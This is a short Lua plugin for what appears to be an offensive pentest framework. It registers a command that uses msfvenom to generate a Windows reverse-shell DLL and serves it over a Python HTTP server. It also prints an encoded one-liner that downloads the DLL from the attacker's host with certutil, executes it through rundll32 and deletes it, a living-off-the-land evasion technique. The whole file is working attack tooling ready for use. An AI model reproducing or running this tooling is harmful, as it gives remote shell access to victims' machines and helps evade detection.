register_command("lolbas_rundll32_dll", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]
    local dll = "sessions/dllhost.dll"

    if not lhost or not lport then return "Error" end

    os.execute(string.format("msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f dll > %s", lhost, lport, dll))

    local cmd = string.format('certutil -urlcache -split -f http://%s/dllhost.dll dllhost.dll && rundll32.dll dllhost.dll,EntryPoint && del dllhost.dll', lhost)

    app.one_cmd("encodewinbase64 " .. cmd)
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")

    print("\n[🔥] One-liner (rundll32):")
    print("\n" .. cmd .. "\n")
    return "✅ DLL generado"
end)